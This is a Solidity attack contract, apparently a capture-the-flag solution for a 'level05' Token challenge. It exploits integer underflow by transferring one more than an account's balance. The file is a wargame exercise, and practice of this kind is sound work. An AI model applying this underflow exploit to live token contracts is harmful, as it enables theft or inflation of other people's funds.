// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "src/level05.sol";
import "hardhat/console.sol";

contract Attacker
{
    Token level05 = Token(0xDdf1341Db2DcDFC908bAE5fE22133D8aeC69AE48);

    function hack() external 
    {
        console.log("balance before: ", level05.balanceOf(0x6025dCF80ac58FC9Bf3Dc3cBb1572A0A44dafE0a));
        level05.transfer(0x6025dCF80ac58FC9Bf3Dc3cBb1572A0A44dafE0a, level05.balanceOf(0x6025dCF80ac58FC9Bf3Dc3cBb1572A0A44dafE0a) + 1);
        console.log("balance after: ", level05.balanceOf(0x6025dCF80ac58FC9Bf3Dc3cBb1572A0A44dafE0a));
    }
}